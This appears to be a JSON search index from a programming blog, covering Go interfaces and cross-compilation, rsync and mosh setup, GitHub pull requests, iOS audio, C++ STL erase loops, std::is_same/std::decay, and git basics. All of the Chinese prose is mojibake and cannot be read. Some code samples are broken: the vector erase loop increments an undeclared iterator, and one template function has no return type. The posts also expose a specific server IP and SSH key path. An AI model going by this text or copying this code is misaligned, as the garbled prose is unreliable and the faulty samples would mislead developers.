//2\n\tfmt.Println(v) //{2}\n}\n```\n\n\n\n# 3. interface èƒ½å¦èµ‹å€¼å®ç°äº†çš„ struct\n\n### 3.1 structæ˜¯å€¼çš„éƒ½å¯ä»¥èµ‹å€¼\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype I interface {\n\tGet()\n}\ntype S struct {\n}\n\nfunc (s S) Get() {\n\tfmt.Println(\"get\")\n}\n\nfunc main() {\n\n\tvar i I\n\n\ti = S{}\n\ti.Get() // get\n\n\ti = &S{}\n\ti.Get() //get\n}\n```\n\n### 3.2 structæ˜¯æŒ‡é’ˆçš„åªèƒ½æŒ‡é’ˆèµ‹å€¼\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype I interface {\n\tGet()\n}\ntype S struct {\n}\n\nfunc (s *S) Get() {\n\tfmt.Println(\"get\")\n}\n\nfunc main() {\n\n\tvar i I\n\n\t//i = S{} //æ­¤å¤„ä¸èƒ½èµ‹å€¼ï¼Œè¿™ä¸€è¡Œå°±ç›´æ¥æŠ¥é”™ã€‚\n\t//i.Get()\n\n\ti = &S{}\n\ti.Get() //get\n}\n```\n\n\n\n# 4. interfaceå®ç°å¤šæ€\n\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype P interface {\n\tSay()\n}\ntype P1 struct{}\ntype P2 struct{}\n\nfunc (p *P1) Say() {\n\tfmt.Println(\"say p1\")\n}\nfunc (p *P2) Say() {\n\tfmt.Println(\"say p2\")\n}\n\nfunc main() {\n\tp1 := &P1{}\n\tp2 := &P2{}\n\n\tvar p P\n\tp = p1\n\tp.Say() // say p1\n\tp = p2\n\tp.Say() // say p2\n}\n```\n\n\n\n# 5. ç»„åˆç»§æ‰¿å¹¶ä¸ä¼šå¤šæ€\n\ngo è¯­è¨€ä¸­ï¼Œå½“å­ç±»è°ƒç”¨çˆ¶ç±»æ–¹æ³•æ—¶ï¼Œâ€œä½œç”¨åŸŸâ€å°†è¿›å…¥çˆ¶ç±»çš„ä½œç”¨åŸŸï¼Œçœ‹ä¸è§å­ç±»çš„æ–¹æ³•å­˜åœ¨ã€‚\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype A struct {\n}\n\nfunc (a *A) ShowA() {\n\tfmt.Println(\"showA\")\n\ta.ShowB()\n}\nfunc (a *A) ShowB() {\n\tfmt.Println(\"showB\")\n}\n\ntype B struct {\n\tA\n}\n\nfunc (b *B) ShowB() {\n\tfmt.Println(\"b showB\")\n}\n\nfunc main() {\n\tb := B{}\n\tb.ShowA()\n}\n\n// showA\n// showB,  not b showB\n```\n\n","tags":["golang"],"categories":["1_golangåŸºç¡€"]},{"title":"golangå¤šå¹³å°äº¤å‰ç¼–è¯‘","url":"%2Fp%2F37af4aa1.html","content":"\n\n### cannot execute binary file exec format error\n\næ˜¯å› ä¸ºmacå’Œubuntuçš„äºŒè¿›åˆ¶æ ¼å¼ä¸ä¸€è‡´\n\n\n### é—®é¢˜\n\nGoæ˜¯ä¸€é—¨ç¼–è¯‘å‹è¯­è¨€ï¼Œæ‰€ä»¥åœ¨ä¸åŒå¹³å°ä¸Šï¼Œéœ€è¦ç¼–è¯‘ç”Ÿæˆä¸åŒæ ¼å¼çš„äºŒè¿›åˆ¶åŒ…ã€‚\nç”±äºGo 1.5å¯¹è·¨å¹³å°ç¼–è¯‘æœ‰äº†ä¸€äº›æ”¹è¿›ï¼ŒåŒ…æ‹¬ç»Ÿä¸€äº†ç¼–è¯‘å™¨ã€é“¾æ¥å™¨ç­‰ã€‚\nç¼–è¯‘æ—¶å€™åªéœ€è¦æŒ‡å®šä¸¤ä¸ªå‚æ•°ï¼šGOOSå’ŒGOARCHå³å¯ã€‚\n\n\n<!-- more -->\n\n\n### ç¼–è¯‘åˆ° linux 64bit\n```\n$ GOOS=linux GOARCH=amd64 go build\n```\n### æˆ–è€…å¯ä»¥ä½¿ç”¨ -o é€‰é¡¹æŒ‡å®šç”ŸæˆäºŒè¿›åˆ¶æ–‡ä»¶åå­—\n```\n$ GOOS=linux GOARCH=amd64 go build -o app.linux\n```\n### ç¼–è¯‘åˆ° linux 32bit\n```\n$ GOOS=linux GOARCH=386 go build\n```\n### ç¼–è¯‘åˆ° windows 64bit\n```\n$ GOOS=windows GOARCH=amd64 go build\n```\n\n### ç¼–è¯‘åˆ° windows 32bit\n```\n$ GOOS=windows GOARCH=386 go build\n```\n\n### ç¼–è¯‘åˆ° Mac OS X 64bit\n```\n$ GOOS=darwin GOARCH=amd64 go build\n```","tags":["golang"],"categories":["3_golangæ‚é¡¹"]},{"title":"rsyncåŒæ­¥æ–‡ä»¶","url":"%2Fp%2Ff67a2ed5.html","content":"\n\nå‚è€ƒé“¾æ¥: http://blog.csdn.net/zpf336/article/details/51659666\n\n\n### æŠŠæœ¬åœ°æ–‡ä»¶åŒæ­¥åˆ°è¿œç¨‹æœåŠ¡å™¨\n```\nrsync -avz '-e ssh -i /Users/liuwei/.ssh/aws.pem' /Users/liuwei/golang/src/web --progress ubuntu@54.191.9.26:/home/ubuntu\n```\n\n<!-- more -->\n### client\n\n```\nrsync -vzrtopg --progress  ubuntu@54.191.9.26::ftp .   //åŒæ­¥æœåŠ¡å™¨çš„æ–‡ä»¶åˆ°å½“å‰ç›®å½•\n```\n\n### server\n\n```\n[ftp]\n\n        comment = public archive\n        path = /home/ubuntu/rsync\n        use chroot = yes\n#       max connections=10\n        lock file = /var/lock/rsyncd\n# the default for read only is yes...\n        read only = yes\n        list = yes\n        uid = nobody\n        gid = nogroup\n#       exclude =\n#       exclude from =\n#       include =\n#       include from =\n        auth users =  ubuntu\n        secrets file = /etc/rsyncd.secrets\n        strict modes = yes\n#       hosts allow =\n#       hosts deny =\n        ignore errors = no\n        ignore nonreadable = yes\n        transfer logging = no\n#       log format = %t: host %h (%a) %o %f (%l bytes). Total %b bytes.\n        timeout = 600\n        refuse options = checksum dry-run\n        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz\n\n```\n\n\n\n### åœ¨æœ¬åœ°æœºå™¨ä¸Šå¯¹ä¸¤ä¸ªç›®å½•åŒæ­¥\n\n```\nrsync -zvr filename1 filename2\n```\nä¸Šè¿°ä»£ç æ˜¯å°†filename1ä¸­çš„æ–‡ä»¶ä¸filename2ä¸­çš„æ–‡ä»¶åŒæ­¥\n\n### ä½¿ç”¨rsync â€“a åŒæ­¥ä¿ç•™æ—¶é—´æŒ‰æ ‡è®°\n\n```\nrsync -azv filename1 filename2  \n```\n\nä½¿ç”¨ä¸Šè¿°å‘½ä»¤ï¼Œå°†filename2ä¸­æ–°åŒæ­¥çš„æ–‡ä»¶çš„æ—¶é—´ä¸filename1ä¸­çš„åˆ›å»ºçš„æ—¶é—´ç›¸åŒï¼Œå®ƒä¿ç•™ç¬¦å·é“¾æ¥ã€æƒé™ã€æ—¶é—´æ ‡è®°ã€ç”¨æˆ·ååŠç»„åç›¸åŒã€‚\n\n### å°†è¿œç¨‹æœåŠ¡å™¨çš„æ–‡ä»¶åŒæ­¥åˆ°æœ¬åœ°\n\n```\nrsync -avz ubuntu@192.168.0.1:/home/ubuntu/filename2 filename1 \n```\n\nä¸Šè¿°å‘½ä»¤æ˜¯å°†è¿œç¨‹192.168.0.1çš„ä¸»æœºä¸Šfilename2åŒæ­¥åˆ°æœ¬åœ°çš„filename1ã€‚\næ³¨æ„ï¼šå¦‚æœè¿œç¨‹ä¸»æœºçš„ç«¯å£ä¸æ˜¯é»˜è®¤çš„22ç«¯å£ï¼Œå‡å¦‚æ˜¯4000ç«¯å£ï¼Œä¸Šè¿°çš„å‘½ä»¤ä¿®æ”¹ä¸ºï¼Œ\n\n```\nrsync -avz '-e ssh -p 4000' ubuntu@192.168.0.1:/home/ubuntu/filename2 filename1 \n```\n\n### ä»æœ¬åœ°åŒæ­¥æ–‡ä»¶åˆ°è¿œç¨‹æœåŠ¡å™¨\n\n```\nrsync -avz filename1 ubuntu@192.168.0.1:/home/ubuntu/filename2  \n```\nä¸Šè¿°å‘½ä»¤æ˜¯å°†æœ¬åœ°çš„filename1åŒæ­¥åˆ°è¿œç¨‹192.168.0.1çš„ä¸»æœºä¸Šã€‚\nåŒç†å¦‚æœç«¯å£ä¸æ˜¯22ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤\n\n```\nrsync -avz '-e ssh -p 4000' filename1 ubuntu@192.168.0.1:/home/ubuntu/filename2  \n```\n","tags":["linux"],"categories":["å‘½ä»¤"]},{"title":"moshè§£å†³sshè¿œç¨‹è¿æ¥å»¶è¿Ÿ","url":"%2Fp%2F21b6636c.html","content":"\n\n### å®‰è£…mosh\n```\nsudo apt-get install mosh //server\nbrew install mobile-shell //mac\n```\n\n\n### éœ€è¦å…ˆè®¾ç½®æœ¬åœ°\nlocale-gen zh_CN.UTF-8\n\n### è¿œç¨‹æœåŠ¡å™¨å¼€å¯ mosh-server\n\n### éœ€è¦awså¼€å¯udp moshçš„ç«¯å£\n\n### å®¢æˆ·ç«¯è¿æ¥\n\n```\n mosh ubuntu@ec2-54-191-9-26.us-west-2.compute.amazonaws.com -ssh=\"ssh -i 'aws.pem'\"\n```\n","tags":["linux"],"categories":["å‘½ä»¤"]},{"title":"gitHubæäº¤PullRequest","url":"%2Fp%2Fa35ae0bf.html","content":"\n\n### forkåˆ«äººçš„ä»“åº“\né¦–å…ˆï¼Œåœ¨ GitHub ä¸Š fork åˆ°è‡ªå·±çš„ä»“åº“ï¼Œå¦‚ docker_user/blockchain_guideï¼Œç„¶å clone åˆ°æœ¬åœ°ï¼Œå¹¶è®¾ç½®ç”¨æˆ·ä¿¡æ¯ã€‚\n\n```\n$ git clone git@github.com:docker_user/blockchain_guide.git\n$ cd blockchain_guide\n$ #do some change on the content\n$ git commit -am \"Fix issue #1: change helo to hello\"\n$ git push\n```\n\n<!-- more -->\n\n### [remote rejected] master -> master (permission denied)\n\n```\nType command:\n\ngit config --global --edit\nAdd these lines of configuration at the end of file:\n\n[credential]\n  helper = osxkeychain\n  useHttpPath = true\n```\n\n\n### æ›´æ–°è‡ªå·±çš„ä»“åº“\n\n  ```\n  git remote add upstream https://github.com/unix2dos/GolangWeb\n  git fetch upstream\n  git checkout master\n  git rebase upstream/master\n  git push -f origin master\n  ```\n","tags":["git"],"categories":["git"]},{"title":"iOSå½•éŸ³é‡åˆ°çš„é—®é¢˜","url":"%2Fp%2F9ecea432.html","content":"### iOSä½¿ç”¨openALæ§åˆ¶å£°éŸ³çš„è¾“å‡ºè®¾å¤‡\né¡¹ç›®ä¸­æ’­æ”¾ioså½•éŸ³çš„æ—¶å€™ä½¿ç”¨çš„æ˜¯AVAudioç›¸å…³åº“, æ’­æ”¾éŸ³æ•ˆåˆæ˜¯ç”¨çš„openAL.\nå¦‚æœåŒæ—¶æˆ–äº¤æ›¿æ’­æ”¾è¿™ä¸¤ç±»å£°éŸ³, ä¼šé€ æˆå£°éŸ³ä¸€ä¼šä»å¬ç­’å‘å£°,ä¸€ä¼šä»æ‰¬å£°å™¨å‘å£°.\nåƒè¾›ä¸‡è‹¦æ‰¾åˆ°è§£å†³æ–¹æ¡ˆ:\n\n```cpp\nInteresting enough, it can be done!\n\nBasically you add a property listener to get route change events:\n    AudioSessionAddPropertyListener(kAudioSessionProperty_AudioRouteChange, audioRouteChangeListenerCallback,0);\n\n\tThen in the callback, determine if its a headphone being plugged-in and override the audio route:\n\t        UInt32 audioRouteOverride = kAudioSessionOverrideAudioRoute_Speaker;\n\t\t\t        AudioSessionSetProperty(kAudioSessionProperty_OverrideAudioRoute, sizeof(audioRouteOverride), &audioRouteOverride);\n\n\t\t\t\t\tToo simple...\n```\n\n\n### iOS AVAudioSession ç›‘å¬é™éŸ³å¼€å…³\nå½•éŸ³ä½¿ç”¨AVAudioSessionæ’­æ”¾çš„æ—¶å€™, æ— æ³•è¯†åˆ«Iphoneæ‰‹æœºçš„ç‰©ç†é™éŸ³å¼€å…³,éœ€è¦ä¿®æ”¹ä¸‹æ¨¡å¼\n\n\n```\n[[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategoryPlayback error:nil];\n```\n\nä¿®æ”¹æˆ\n        \n```\n[[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategorySoloAmbient error:nil];//ç›‘å¬é™éŸ³\n```\n\n\n\n","tags":["ios"],"categories":["ios"]},{"title":"c++stlå®¹å™¨å¾ªç¯earseç”¨æ³•","url":"%2Fp%2F6556ac6a.html","content":"\n### vector deque\nåœ¨ä½¿ç”¨ vectorã€dequeéå†åˆ é™¤å…ƒç´ æ—¶ï¼Œä¹Ÿå¯ä»¥é€šè¿‡eraseçš„è¿”å›å€¼æ¥è·å–ä¸‹ä¸€ä¸ªå…ƒç´ çš„ä½ç½®ï¼š\n\n```\n      std::vector< int> Vec;\n      std::vector< int>::iterator itVec;\n      for( itVec = Vec.begin(); itVec != Vec.end(); )\n      {\n            if( WillDelete( *itVec) )\n            {\n                 itVec = Vec.erase( itVec);\n            }\n            else\n               itList++;\n      }\n```\n<!-- more -->\n\n### list set map \nåœ¨ ä½¿ç”¨ listã€set æˆ– mapéå†åˆ é™¤æŸäº›å…ƒç´ æ—¶å¯ä»¥è¿™æ ·ä½¿ç”¨ï¼š\n\n```\n      std::list< int> List;\n      std::list< int>::iterator itList;\n      for( itList = List.begin(); itList != List.end(); )\n      {\n            if( WillDelete( *itList) )\n            {\n               itList = List.erase( itList);\n            }\n            else\n               itList++;\n      }\n```\n\n\n```\n      std::list< int> List;\n      std::list< int>::iterator itList;\n      for( itList = List.begin(); itList != List.end(); )\n      {\n            if( WillDelete( *itList) )\n            {\n               List.erase( itList++);\n            }\n            else\n               itList++;\n      }\n```\n","tags":["c++"],"categories":["c++"]},{"title":"c++11çš„æ¨¡æ¿ç±»å‹åˆ¤æ–­std::is_sameå’Œstd::decay","url":"%2Fp%2F1e4be646.html","content":"\né—®é¢˜æå‡ºï¼šæœ‰ä¸€ä¸ªæ¨¡æ¿å‡½æ•°ï¼Œå‡½æ•°åœ¨å¤„ç†intå‹å’Œdoubleå‹æ—¶éœ€è¦è¿›è¡Œç‰¹æ®Šçš„å¤„ç†ï¼Œé‚£ä¹ˆæ€ä¹ˆåœ¨ç¼–è¯‘æœŸçŸ¥é“ä¼ å…¥çš„å‚æ•°çš„æ•°æ®ç±»å‹æ˜¯intå‹è¿˜æ˜¯doubleå‹å‘¢ï¼Ÿ \nå¦‚ï¼š\n\n\n```cpp\n#include <iostream>\ntemplate <typename TYPE>\nvoid typeCheck(TYPE data)\n{\n    //do something check data type\n\t//std::cout<< out put the type\n}\n```\n\nè¿™é‡Œå°±éœ€è¦ç”¨åˆ°C++11çš„type_traitså¤´æ–‡ä»¶äº†ï¼Œtype_traitså¤´æ–‡ä»¶å®šä¹‰äº†å¾ˆå¤šç±»å‹æ£€æŸ¥ç›¸å…³çš„æ–¹æ³•ï¼Œä¸Šé¢çš„ä¾‹å­å…·ä½“ç”¨åˆ°äº†å…¶ä¸­ä¸¤ä¸ªç»“æ„ï¼š\n\n<!-- more -->\n\n## std::is_same åˆ¤æ–­ç±»å‹æ˜¯å¦ä¸€è‡´\n\nä½äºå¤´æ–‡ä»¶`<type_traits>`ä¸­\nè¿™ä¸ªç»“æ„ä½“ä½œç”¨å¾ˆç®€å•ï¼Œå°±æ˜¯ä¸¤ä¸ªä¸€æ ·çš„ç±»å‹ä¼šè¿”å›true\n\n```cpp\nbool isInt = std::is_same<int, int>::value; //ä¸ºtrue\n```\n\nä¸‹é¢æ˜¯å®˜æ–¹çš„ä¾‹å­ï¼š\n\n```cpp\n#include <iostream>\n#include <type_traits>\n#include <cstdint>\n\nvoid print_separator()\n{\n    std::cout << \"-----\\n\";\n}\n\nint main()\n{\n    std::cout << std::boolalpha;\n\n    std::cout << std::is_same<int, int32_t>::value << '\\n';   // true\n    std::cout << std::is_same<int, int64_t>::value << '\\n';   // false\n    std::cout << std::is_same<float, int32_t>::value << '\\n'; // false\n\n    print_separator();\n\n    std::cout << std::is_same<int, int>::value << \"\\n\";          // true\n    std::cout << std::is_same<int, unsigned int>::value << \"\\n\"; // false\n    std::cout << std::is_same<int, signed int>::value << \"\\n\";   // true\n\n    print_separator();\n\n    // unlike other types 'char' is not 'unsigned' and not 'signed'\n    std::cout << std::is_same<char, char>::value << \"\\n\";          // true\n    std::cout << std::is_same<char, unsigned char>::value << \"\\n\"; // false\n    std::cout << std::is_same<char, signed char>::value << \"\\n\";   // false\n}\n```\n\né€šè¿‡std::is_sameå³å¯åˆ¤æ–­ä¸¤ä¸ªç±»å‹æ˜¯å¦ä¸€æ ·ï¼Œç‰¹åˆ«åœ¨æ¨¡æ¿é‡Œé¢ï¼Œåœ¨ä¸æ¸…æ¥šæ¨¡æ¿çš„å‚æ•°æ—¶ï¼Œæ­¤åŠŸèƒ½å¯ä»¥å¯¹ä¸€äº›ç‰¹å®šçš„å‚æ•°ç±»å‹è¿›è¡Œç‰¹æ®Šçš„å¤„ç†ã€‚\n\n<!-- more -->\n\n> è¿™é‡Œè¯´ä¸ªé¢˜å¤–è¯ï¼Œå¤§å®¶æ˜¯å¦é€šè¿‡std::is_sameå‘ç°ï¼Œcharæ—¢ä¸æ˜¯unsigned charä¹Ÿä¸æ˜¯signed charï¼Œcharå°±æ˜¯charï¼Œè¿™å’Œintæ˜¯signed intçš„ç¼©å†™æ˜¯ä¸ä¸€æ ·çš„ï¼Œcharçš„è¡¨è¾¾èŒƒå›´å¯èƒ½ç­‰åŒäºsigned charï¼Œä¹Ÿå¯èƒ½ç­‰åŒäºunsigned charï¼Œå–å†³äºç¼–è¯‘å™¨ï¼Œä¸€èˆ¬æ˜¯ç­‰åŒäºsigned charï¼Œä½†è¿™ä¸ªä»…ä»…æ˜¯èŒƒå›´ç­‰åŒï¼Œå°±åƒ32ä½ä¸Šintå’ŒlongèŒƒå›´æ˜¯ä¸€æ ·çš„ï¼Œä½†ä¸æ˜¯åŒä¸€ä¸ªç±»å‹ã€‚\n> \n> å› ä¸ºç”¨é€”ä¸åŒï¼Œcharç”¨äºè¡¨è¾¾å­—ç¬¦ï¼Œç†è®ºä¸Šä¸åº”è¯¥å…³å¿ƒå…¶æ­£è´Ÿçš„å®ç°ï¼Œè€Œsigned char å’Œ unsigned char ç”¨äºè¡¨è¾¾æ•°å€¼ï¼Œæˆ–å¯ç§»æ¤çš„charã€‚\n\n\nå›åˆ°æ­£æ–‡ï¼Œstd::is_sameå¯ä»¥åˆ¤æ–­ä¸¤ç§ç±»ä¼¼æ˜¯å¦ä¸€æ ·ï¼Œé‚£ä¹ˆç”¨åœ¨æ¨¡æ¿é‡Œå°±æ˜¯åˆ©å™¨äº†ï¼Œæœ¬ä½ä¸€å¼€å§‹æåˆ°çš„é‚£ä¸ªé—®é¢˜å°±å¯ä»¥è¿™æ ·å†™ï¼š\n\n```cpp\n#include <iostream>\ntemplate<typename TYPE>\ntypeCheck(TYPE data)\n{\n    if(std::is_same<TYPE,int>::value)\n    {\n        std::cout<<\"int type\";\n        //do something int \n    }\n    else\n    {\n        //.........\n    }\n}\n```\n\nçœ‹ä¼¼å¾ˆç¾å¥½ï¼Œå†çœ‹ä¸€ä¸ªç¤ºä¾‹ï¼š\n\n```cpp\n// is_same example\n#include <iostream>\n#include <type_traits>\n#include <cstdint>\n\ntypedef int integer_type;\nstruct A { int x,y; };\nstruct B { int x,y; };\ntypedef A C;\n\nint main() {\n      std::cout << std::boolalpha;\n      std::cout << \"is_same:\" << std::endl;\n      std::cout << \"int, const int: \" << std::is_same<int, const int>::value << std::endl;//false\n      std::cout << \"int, int&: \" << std::is_same<int, int&>::value << std::endl;//false\n      std::cout << \"int, const int&: \" << std::is_same<int, const int&>::value << std::endl;//false\n      std::cout << \"int, integer_type: \" << std::is_same<int, integer_type>::value << std::endl;//true\n      std::cout << \"A, B: \" << std::is_same<A,B>::value << std::endl;//false\n      std::cout << \"A, C: \" << std::is_same<A,C>::value << std::endl;//true\n      std::cout << \"signed char, std::int8_t: \" << std::is_same<signed char,std::int8_t>::value << std::endl;//true\n      return 0;\n}\n```\nè¾“å‡ºï¼š\n\n```cpp\nis_same:\nint, const int: false\nint, int&: false\nint, const int&: false\nint, integer_type: true\nA, B: false\nA, C: true\nsigned char, std::int8_t: true\n```\n\nå¯ä»¥å‘ç°std::is_sameçš„åˆ¤æ–­æ˜¯å¾ˆä¸¥æ ¼çš„,å†çœ‹ä¸‹é¢çš„ä¸€ä¸ªä¾‹å­ï¼š\n\n```cpp\n#include <stdlib.h>\n#include <iostream>\n#include <type_traits>\n\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data);\n\nint main()\n{\n    int a = 1;\n    const int& b = a;\n    int& c = a;\n    int d[12];\n    const int& e = d[7];\n    typeCheck(a);//int type\n    typeCheck(b);//int type\n    typeCheck(c);//int type\n    typeCheck(d[7]);//int type\n    typeCheck(e);//int type\n    typeCheck(8);//int type\n    return 0;\n}\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data)\n{\n    if(std::is_same<TYPE,int>::value)\n    {\n        std::cout<<\"int type\"<<std::endl;\n    }\n    else if(std::is_same<TYPE,std::string>::value)\n    {\n        std::cout<<\"string type\"<<std::endl;\n    }\n    else\n    {\n        std::cout<<\"other type\";\n    }\n}\n```\nè¾“å‡ºï¼š\n\n```cpp\nint type\nint type\nint type\nint type\nint type\nint type\n```\n\næµ‹è¯•åå‘ç°ï¼Œè™½ç„¶å˜é‡b,c, eä½¿ç”¨çš„æ˜¯å¼•ç”¨ï¼Œstd::is_sameé‚£ä¹ˆä¸¥æ ¼ä¸ºä»€ä¹ˆæ˜¯int_typeå‘¢? å› ä¸ºåœ¨å†™æ¨¡æ¿å‡½æ•°æ—¶ï¼Œç»å¸¸ä¼šå¼ºåˆ¶æŒ‡å®šconstå¼•ç”¨è¿›è¡Œä¼ å‚ï¼Œä»¥å…è¿›è¡Œæ•°æ®æ‹·è´ï¼Œè¿™æ—¶å€™is_sameå°±åšå‡ºäº†ç›¸ç­‰çš„åˆ¤æ–­.\n\n\n\n> å¦‚æœæˆ‘ä»¬æ˜¾ç¤ºçš„æŒ‡å®šæ¨¡æ¿å‚æ•°ç±»å‹æ—¶æƒ…å†µæœ‰ä¸ä¸€æ ·äº†ï¼š\n\n```cpp\n#include <stdlib.h>\n#include <iostream>\n#include <type_traits>\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data);\n\nint main()\n{\n    int a = 1;\n    const int& b = a;\n    int& c = a;\n    int d[12];\n\n    typeCheck<int>(a);        //int type\n    typeCheck<const int&>(b);//other type\n    typeCheck<int &>(c);        //other type\n    typeCheck<const int&>(d[7]);//other type\n    typeCheck(8);                //int type\n    return 0;\n}\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data)\n{\n    if(std::is_same<TYPE,int>::value)\n    {\n        std::cout<<\"int type\"<<std::endl;\n    }\n    else if(std::is_same<TYPE,std::string>::value)\n    {\n        std::cout<<\"string type\"<<std::endl;\n    }\n    else\n    {\n        std::cout<<\"other type\";\n    }\n}\n```\nè¾“å‡ºï¼š\n\n```cpp\nint type\nother type\nother type\nother type\nint type\n```\nç¬é—´ç»“æœå°±ä¸ä¸€æ ·äº†ï¼Œè¿™å¾ˆå¥½äº†è§£ï¼Œä»ä¸Šé¢å¯çŸ¥é“ï¼Œstd::is_sameå¯¹int\\ const int\\ int &\\ const int& ç­‰éƒ½æ˜¯åŒºåˆ«å¯¹å¾…çš„.\n\n\n> ä½†æ˜¯æœ‰æ—¶å€™å…¶å®æˆ‘ä»¬è¿˜æ˜¯å¸Œæœ›TYPEå’Œconst TYPE& æ˜¯èƒ½è®¤ä¸ºæ˜¯ä¸€æ ·çš„ï¼Œè¿™æ—¶å°±éœ€è¦std::decayè¿›è¡Œé€€åŒ–å¤„ç†\n\n\n## std::decay é€€åŒ–ç±»å‹çš„ä¿®é¥°\n\nstd::decayå°±æ˜¯å¯¹ä¸€ä¸ªç±»å‹è¿›è¡Œé€€åŒ–å¤„ç†ï¼Œä»–çš„å®ç°å¦‚ä¸‹:\n\n```cpp\ntemplate< class T >\nstruct decay {\nprivate:\n    typedef typename std::remove_reference<T>::type U;\npublic:\n    typedef typename std::conditional< \n        std::is_array<U>::value,\n        typename std::remove_extent<U>::type*,\n        typename std::conditional< \n            std::is_function<U>::value,\n            typename std::add_pointer<U>::type,\n            typename std::remove_cv<U>::type\n        >::type\n    >::type type;\n};\n```\nçœ‹ç€æ¯”è¾ƒæŠ½è±¡ï¼Œå…¶å®å°±æ˜¯æŠŠå„ç§å¼•ç”¨å•Šä»€ä¹ˆçš„ä¿®é¥°å»æ‰ï¼ŒæŠŠcosnt int&é€€åŒ–ä¸ºintï¼Œè¿™æ ·å°±èƒ½é€šè¿‡std::is_sameæ­£ç¡®è¯†åˆ«å‡ºåŠ äº†å¼•ç”¨çš„ç±»å‹äº† \nä¸Šé¢çš„ä¾‹å­æ”¹ä¸ºï¼š\n\n```cpp\n#include <iostream>\n#include <type_traits>\n\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data);\n\nint main()\n{\n    int a = 1;\n    const int& b = a;\n    int& c = a;\n    int d[12];\n\n    typeCheck<int>(a);//int type\n    typeCheck<const int&>(b);//int type\n    typeCheck<int &>(c);//int type\n    typeCheck<const int&>(d[7]);//int type\n    typeCheck(8);//int type\n    return 0;\n}\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data)\n{\n    if(std::is_same<typename std::decay<TYPE>::type,int>::value)//c++11\n    //if(std::is_same<std::decay_t<TYPE>, int>::value)//c++14\n    {\n        std::cout<<\"int type\"<<std::endl;\n    }\n    else\n    {\n        std::cout<<\"other type\"<<std::endl;\n    }\n}\n```\n\nåœ¨cpprefæœ‰ä¸ªæ›´åŠ è¯¦ç»†çš„ä¾‹å­ï¼š\n\n```cpp\n#include <iostream>\n#include <type_traits>\n\ntemplate <typename T, typename U>\nstruct decay_equiv : \n    std::is_same<typename std::decay<T>::type, U>::type \n{};\n\nint main()\n{\n    std::cout << std::boolalpha\n              << decay_equiv<int, int>::value << '\\n'\n              << decay_equiv<int&, int>::value << '\\n'\n              << decay_equiv<int&&, int>::value << '\\n'\n              << decay_equiv<const int&, int>::value << '\\n'\n              << decay_equiv<int[2], int*>::value << '\\n'\n              << decay_equiv<int(int), int(*)(int)>::value << '\\n';\n}\n```\n\nè¾“å‡º:\n\n```cpp\ntrue\ntrue\ntrue\ntrue\ntrue\ntrue\n```\n\n## æ€»ç»“ï¼š\n\n+ åœ¨æ¨¡æ¿é‡Œå¯ä»¥é€šè¿‡std::is_sameåˆ¤æ–­æ¨¡æ¿çš„ç±»å‹ï¼Œä»è€Œå®ç°å¯¹ä¸åŒç±»å‹çš„åŒºåˆ«å¯¹å¾…\n\n+ åœ¨å †ç±»å‹è¦æ±‚ä¸æ˜¯éå¸¸ä¸¥æ ¼çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨std::decayæŠŠç±»å‹é€€åŒ–ä¸ºåŸºæœ¬å½¢æ€ï¼Œç»“åˆstd::is_sameç”¨ï¼Œå¯ä»¥åˆ¤æ–­å‡ºæ›´å¤šçš„æƒ…å†µ\n","tags":["c++"],"categories":["c++"]},{"title":"gitå®ç”¨æ“ä½œæ€»ç»“","url":"%2Fp%2F42eae4e7.html","content":"\n# 1. git åŸºç¡€æ“ä½œ\n\n### 1.1 gitçš„åŸºç¡€æ“ä½œ\n\n1. å‘½ä»¤git add \t      æŠŠæ–‡ä»¶æ·»åŠ åˆ°ä»“åº“\n\n2. å‘½ä»¤git commit \t  æŠŠæ–‡ä»¶æäº¤åˆ°ä»“åº“\n\n3. å‘½ä»¤git pull \t  æŠŠè¿œç¨‹ä»“åº“æ‹‰å–æ–‡ä»¶\n\n4. å‘½ä»¤git push       æŠŠæ–‡ä»¶æäº¤åˆ°è¿œç¨‹ä»“åº“\n\n5. å‘½ä»¤git log \t      æŸ¥çœ‹gitæäº¤æ—¥å¿—\n\n6. å¦‚æœå«Œè¾“å‡ºä¿¡æ¯å¤ªå¤š, å¯ä»¥åŠ ä¸Š--pretty=onelineå‚æ•°. å¦å¤–ä¹Ÿå¯ä»¥èŠ±å¼logè¾“å‡º, git lgæŸ¥çœ‹ä¸‹\n\n   ```bash\n   git config --global alias.lg \"log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit --date=relative\"\n   ```\n\n7. å‘½ä»¤git diff æŸ¥çœ‹ç‰ˆæœ¬ä¹‹é—´æ–‡ä»¶ä¿®æ”¹å˜åŒ–\n\n   ```bash\n   git diff 87b91b6 f9b3075 [--name-only]åŠ ä¸Šå¯ä»¥åªçœ‹æ–‡ä»¶åå­—\n   ```\n\n<!-- more -->\n\n\n### 1.2 git æ ‡ç­¾æ“ä½œ\n\nå‘½ä»¤git tag <name>ç”¨äºæ–°å»ºä¸€ä¸ªæ ‡ç­¾ï¼Œé»˜è®¤ä¸ºHEADï¼Œä¹Ÿå¯ä»¥æŒ‡å®šä¸€ä¸ªcommit idï¼›\n\ngit tag -a <tagname> -m \"blablabla...\"å¯ä»¥æŒ‡å®šæ ‡ç­¾ä¿¡æ¯ï¼›\n\ngit tag -s <tagname> -m \"blablabla...\"å¯ä»¥ç”¨PGPç­¾åæ ‡ç­¾ï¼›\n\nå‘½ä»¤git tagå¯ä»¥æŸ¥çœ‹æ‰€æœ‰æ ‡ç­¾ã€‚\n\nå‘½ä»¤git push origin <tagname>å¯ä»¥æ¨é€ä¸€ä¸ªæœ¬åœ°æ ‡ç­¾ï¼›\n\nå‘½ä»¤git push origin 